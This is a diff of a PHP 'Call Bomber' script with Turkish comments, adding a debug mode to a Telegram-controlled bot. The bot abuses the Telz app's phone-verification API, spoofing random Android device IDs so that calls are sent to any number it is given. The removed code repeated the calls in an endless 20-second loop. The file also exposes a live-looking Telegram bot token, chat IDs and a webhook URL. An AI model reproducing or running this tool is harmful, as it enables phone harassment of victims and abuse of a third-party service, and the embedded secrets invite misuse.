@@ -1,12 +1,11 @@
 <?php
 /**
- * Ritalin Tool Call Bomber - PHP Bot + Telegram Webhook
- * Telz API üzerinden arama gönderir.
- * Telegram bot komutu ile veya webhook ile aktif edilir.
+ * Ritalin Tool Call Bomber - DEBUG VERSION
+ * Telz API detaylı analiz ve hata ayıklama
  */
 
 // ==================== KONFIGÜRASYON ====================
-define('MODE', 'TEST_RANDOM_IDS'); // TEST_RANDOM_IDS veya DEBOUNCE
+define('MODE', 'TEST_RANDOM_IDS');
 define('GOKU', 300);
 define('BASE_URL', 'https://api.telz.com/');
 define('USER_AGENT', 'Telz-Android/17.5.33');
@@ -17,11 +16,9 @@ define('LOOP_INTERVAL', 20);
 define('MAX_RUNS', 0);
 
 // ==================== TELEGRAM BOT KONFIG ====================
-// ==================== TELEGRAM BOT KONFIG ====================
 define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
 define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');
-define('ADMIN_CHAT_ID', '7650776904'); // Admin kullanıcı ID
-define('GROUP_CHAT_ID', '-1003963392550'); // Grup ID (isteğe bağlı)
+define('ADMIN_CHAT_ID', '');
 
 // ==================== FONKSİYONLAR ====================
 
@@ -44,7 +41,10 @@ function generateUUID() {
     );
 }
 
-function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
+/**
+ * Detaylı API isteği - Tüm yanıtı loglar
+ */
+function telzRequestDebug($endpoint, $payload, $androidId = null, $uuid = null) {
     if (MODE === 'TEST_RANDOM_IDS' && $androidId === null) {
         $androidId = randomAndroidId();
     }
@@ -57,10 +57,19 @@ function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
     $payload['ts'] = (int)(microtime(true) * 1000);
     $payload['uuid'] = $uuid;
     
+    $jsonPayload = json_encode($payload);
+    
+    // 1. İstek detaylarını logla
+    $logData = "\n" . str_repeat("=", 60) . "\n";
+    $logData .= "📤 [REQUEST] $endpoint\n";
+    $logData .= "📦 PAYLOAD: " . $jsonPayload . "\n";
+    $logData .= "🆔 Android ID: " . ($payload['android_id'] ?? 'null') . "\n";
+    $logData .= "🔑 UUID: " . ($payload['uuid'] ?? 'null') . "\n";
+    
     $ch = curl_init(BASE_URL . $endpoint);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonPayload);
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
         'User-Agent: ' . USER_AGENT,
         'Accept-Encoding: gzip',
@@ -70,33 +79,76 @@ function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_HEADER, true); // Header'ları da al
     
     $response = curl_exec($ch);
+    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
     $error = curl_error($ch);
     curl_close($ch);
+    
+    // Header ve body'yi ayır
+    $headers = substr($response, 0, $headerSize);
+    $body = substr($response, $headerSize);
+    
+    // 2. Yanıt detaylarını logla
+    $logData .= "\n📥 [RESPONSE] $endpoint\n";
+    $logData .= "📊 HTTP Status: $httpCode\n";
+    $logData .= "⏱️ Süre: " . number_format($totalTime, 3) . "s\n";
+    $logData .= "📋 HEADERS:\n$headers\n";
+    $logData .= "📄 BODY: " . substr($body, 0, 2000) . (strlen($body) > 2000 ? "\n... (devamı kesildi)" : "") . "\n";
+    
+    // 3. JSON parse et
+    $decoded = json_decode($body, true);
+    if ($decoded !== null) {
+        $logData .= "✅ JSON PARSE BAŞARILI\n";
+        $logData .= "🔍 PARSED DATA: " . json_encode($decoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
+    } else {
+        $logData .= "❌ JSON PARSE HATASI!\n";
+        $logData .= "RAW: " . substr($body, 0, 500) . "\n";
+    }
+    
+    $logData .= str_repeat("=", 60) . "\n";
+    
+    // Log dosyasına yaz
+    file_put_contents('telz_debug.log', $logData, FILE_APPEND);
+    
+    // Ayrıca ekrana da yaz (CLI için)
+    if (php_sapi_name() === 'cli') {
+        echo $logData;
+    }
     
     if ($httpCode === 429) {
         throw new Exception("Fazla deneme! Retry-After kontrol edin.");
     }
     if ($httpCode >= 400) {
-        throw new Exception("HTTP Hata: $httpCode - $response");
+        throw new Exception("HTTP Hata: $httpCode - " . substr($body, 0, 200));
     }
     if ($error) {
         throw new Exception("CURL Hatası: $error");
     }
     
-    return json_decode($response, true) ?? $response;
+    return $decoded ?? $body;
 }
 
-function sendCall($phone) {
+function sendCallDebug($phone) {
+    $logStart = "\n" . str_repeat("🚀", 30) . "\n";
+    $logStart .= "📞 ARAMA BAŞLATILIYOR: $phone\n";
+    $logStart .= "⏰ Zaman: " . date('Y-m-d H:i:s') . "\n";
+    $logStart .= str_repeat("🚀", 30) . "\n";
+    file_put_contents('telz_debug.log', $logStart, FILE_APPEND);
+    
     try {
         $androidId = randomAndroidId();
         $uuid = generateUUID();
         $deviceName = (MODE === 'TEST_RANDOM_IDS') ? randomDeviceName() : 'Xiaomi 2311DRK48G';
         
-        telzRequest('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
-        telzRequest('app/run', [
+        // 1. auth_list
+        $result = telzRequestDebug('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
+        
+        // 2. run
+        $result = telzRequestDebug('app/run', [
             'event' => 'run',
             'device_name' => $deviceName,
             'ipv4_address' => '10.1.10.1',
@@ -110,30 +162,50 @@ function sendCall($phone) {
             'sim_country' => 'tr'
         ], $androidId, $uuid);
         
-        telzRequest('app/stat_btns', [
+        // 3. stat_btns
+        $result = telzRequestDebug('app/stat_btns', [
             'event' => 'stat_btns',
             'btn' => 'on_reg_continue'
         ], $androidId, $uuid);
         
-        telzRequest('app/validate_phonenumber', [
+        // 4. validate_phonenumber
+        $result = telzRequestDebug('app/validate_phonenumber', [
             'event' => 'validate_phonenumber',
             'phone' => $phone,
             'region' => 'TR'
         ], $androidId, $uuid);
         
-        $result = telzRequest('app/auth_call', [
+        // 5. auth_call - ASIL ARAMA
+        $result = telzRequestDebug('app/auth_call', [
             'event' => 'auth_call',
             'phone' => $phone,
             'attempt' => '0',
             'lang' => 'tr'
         ], $androidId, $uuid);
         
+        // Detaylı sonuç analizi
+        $logResult = "\n" . str_repeat("📊", 30) . "\n";
+        $logResult .= "🔍 SONUÇ ANALİZİ:\n";
+        $logResult .= "STATUS: " . ($result['status'] ?? 'YOK') . "\n";
+        $logResult .= "REASON: " . ($result['reason'] ?? 'YOK') . "\n";
+        $logResult .= "TAM YANIT: " . json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
+        $logResult .= str_repeat("📊", 30) . "\n";
+        file_put_contents('telz_debug.log', $logResult, FILE_APPEND);
+        
         if (isset($result['status']) && $result['status'] === 'ok') {
-            return ['success' => true, 'message' => "✅ Arama gönderildi: $phone"];
+            return ['success' => true, 'message' => "✅ Arama gönderildi: $phone", 'debug' => $result];
         } else {
-            return ['success' => false, 'message' => "❌ Hata: " . ($result['reason'] ?? 'Bilinmeyen')];
+            $error = $result['reason'] ?? json_encode($result) ?? 'Bilinmeyen';
+            return ['success' => false, 'message' => "❌ Hata: $error", 'debug' => $result];
         }
+        
     } catch (Exception $e) {
+        $logError = "\n" . str_repeat("❌", 30) . "\n";
+        $logError .= "🚨 EXCEPTION: " . $e->getMessage() . "\n";
+        $logError .= "📄 TRACE: " . $e->getTraceAsString() . "\n";
+        $logError .= str_repeat("❌", 30) . "\n";
+        file_put_contents('telz_debug.log', $logError, FILE_APPEND);
+        
         return ['success' => false, 'message' => "❌ Hata: " . $e->getMessage()];
     }
 }
@@ -153,16 +225,46 @@ function sendTelegramMessage($chatId, $text) {
     return json_decode($response, true);
 }
 
+// ==================== WEBHOOK KURULUMU ====================
+if (isset($_GET['setwebhook'])) {
+    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
+    $result = file_get_contents($url);
+    echo "Webhook Kurulum Sonucu:\n";
+    echo $result;
+    exit;
+}
+
 // ==================== WEBHOOK (Telegram Bot) ====================
 if (php_sapi_name() !== 'cli') {
     $content = file_get_contents('php://input');
     $update = json_decode($content, true);
     
-    // Webhook set etme (ilk kurulum)
+    // Debug: Gelen update'i logla
+    file_put_contents('telz_debug.log', "\n📨 WEBHOOK UPDATE: " . json_encode($update, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND);
+    
+    // Webhook set etme
     if (isset($_GET['setwebhook'])) {
         $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
         $result = file_get_contents($url);
         echo $result;
+        exit;
+    }
+    
+    // Log dosyasını görüntüle
+    if (isset($_GET['log'])) {
+        header('Content-Type: text/plain; charset=utf-8');
+        if (file_exists('telz_debug.log')) {
+            echo file_get_contents('telz_debug.log');
+        } else {
+            echo "Log dosyası bulunamadı.";
+        }
+        exit;
+    }
+    
+    // Log dosyasını temizle
+    if (isset($_GET['clearlog'])) {
+        file_put_contents('telz_debug.log', '');
+        echo "Log temizlendi.";
         exit;
     }
     
@@ -172,74 +274,86 @@ if (php_sapi_name() !== 'cli') {
         $text = $update['message']['text'] ?? '';
         $fromId = $update['message']['from']['id'] ?? '';
         
-        // Sadece admin kullanabilir
-        if (ADMIN_CHAT_ID && $chatId != ADMIN_CHAT_ID) {
-            sendTelegramMessage($chatId, "⛔ Bu botu kullanma yetkiniz yok.");
+        // Sadece admin
+        if ($chatId != ADMIN_CHAT_ID) {
+            sendTelegramMessage($chatId, "⛔ Yetkiniz yok.");
             exit;
         }
         
-        // /start komutu
+        // /start
         if ($text === '/start') {
-            sendTelegramMessage($chatId, "📞 <b>Call Bomber</b>\n\n"
+            sendTelegramMessage($chatId, "📞 <b>Call Bomber DEBUG</b>\n\n"
                 . "Komutlar:\n"
-                . "/call +90547374737 - Arama gönder\n"
-                . "/stop - Durdur\n"
+                . "/call +90568533894 - Arama gönder (debug)\n"
+                . "/log - Log dosyasını göster\n"
+                . "/clearlog - Log'u temizle\n"
                 . "/status - Bot durumu");
             exit;
         }
         
-        // /call +90
-        if (strpos($text, '/call ') === 0) {
-            $phone = trim(substr($text, 6));
-            if (empty($phone)) {
-                sendTelegramMessage($chatId, "❌ Lütfen numara girin: /call +90");
-                exit;
+        // /log
+        if ($text === '/log') {
+            if (file_exists('telz_debug.log')) {
+                $log = file_get_contents('telz_debug.log');
+                $log = substr($log, -4000); // Son 4000 karakter
+                sendTelegramMessage($chatId, "<pre>" . htmlspecialchars($log) . "</pre>");
+            } else {
+                sendTelegramMessage($chatId, "Log dosyası yok.");
             }
-            
-            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
-            $result = sendCall($phone);
-            sendTelegramMessage($chatId, $result['message']);
             exit;
         }
         
-        // /stop
-        if ($text === '/stop') {
-            sendTelegramMessage($chatId, "⏹️ Bot durduruldu. (Bu özellik webhook ile durdurma için örnek)");
+        // /clearlog
+        if ($text === '/clearlog') {
+            file_put_contents('telz_debug.log', '');
+            sendTelegramMessage($chatId, "✅ Log temizlendi.");
+            exit;
+        }
+        
+        // /call
+        if (strpos($text, '/call ') === 0) {
+            $phone = trim(substr($text, 6));
+            if (empty($phone)) {
+                sendTelegramMessage($chatId, "❌ Numara girin: /call +90");
+                exit;
+            }
+            
+            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...\n📝 Log: " . WEBHOOK_URL . "?log");
+            $result = sendCallDebug($phone);
+            sendTelegramMessage($chatId, $result['message']);
             exit;
         }
         
         // /status
         if ($text === '/status') {
-            sendTelegramMessage($chatId, "✅ Bot aktif\nMODE: " . MODE . "\nLOOP: " . LOOP_INTERVAL . "s");
+            sendTelegramMessage($chatId, "✅ Bot aktif (DEBUG MODE)\nMODE: " . MODE . "\nLOOP: " . LOOP_INTERVAL . "s\n📝 Log: " . WEBHOOK_URL . "?log");
             exit;
         }
         
-        // Tanımsız komut
-        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start yazın.");
+        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start");
     }
     
-    // Normal HTTP isteği (GET/POST ile phone)
+    // Normal HTTP isteği
     $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
     if ($phone) {
-        $result = sendCall($phone);
+        $result = sendCallDebug($phone);
         header('Content-Type: application/json');
         echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
         exit;
     }
     
-    // Boş istek
-    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber Aktif']);
+    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber DEBUG Aktif', 'log' => WEBHOOK_URL . '?log']);
     exit;
 }
 
 // ==================== CLI BOT MODU ====================
 if (php_sapi_name() === 'cli') {
     echo "\n========================================\n";
-    echo "  📞 CALL BOMBER\n";
+    echo "  📞 CALL BOMBER - DEBUG MODE\n";
     echo "========================================\n";
     echo "  MODE: " . MODE . "\n";
-    echo "  LOOP_INTERVAL: " . LOOP_INTERVAL . " saniye\n";
-    echo "  MAX_RUNS: " . (MAX_RUNS === 0 ? 'Sonsuz' : MAX_RUNS) . "\n";
+    echo "  LOOP_INTERVAL: " . LOOP_INTERVAL . "s\n";
+    echo "  📝 Log: telz_debug.log\n";
     echo "========================================\n\n";
     
     $phone = readline("Numara gir (+90xx): ");
@@ -250,21 +364,11 @@ if (php_sapi_name() === 'cli') {
         exit(1);
     }
     
-    echo "\n🚀 Bot başlatılıyor... (Ctrl+C ile durdur)\n\n";
+    echo "\n🚀 Debug başlatılıyor...\n";
+    echo "📝 Log dosyasını izlemek için: tail -f telz_debug.log\n\n";
     
-    $runCount = 0;
-    while (MAX_RUNS === 0 || $runCount < MAX_RUNS) {
-        $runCount++;
-        echo "\n--- Döngü #$runCount ---\n";
-        
-        $result = sendCall($phone);
-        echo $result['message'] . "\n";
-        
-        if (MAX_RUNS === 0 || $runCount < MAX_RUNS) {
-            echo "⏳ " . LOOP_INTERVAL . " saniye bekleniyor...\n";
-            sleep(LOOP_INTERVAL);
-        }
-    }
-    
-    echo "\n✅ Bot tamamlandı. $runCount döngü çalıştı.\n";
+    $result = sendCallDebug($phone);
+    echo "\n" . str_repeat("=", 60) . "\n";
+    echo "📊 SONUÇ: " . $result['message'] . "\n";
+    echo str_repeat("=", 60) . "\n";
 }
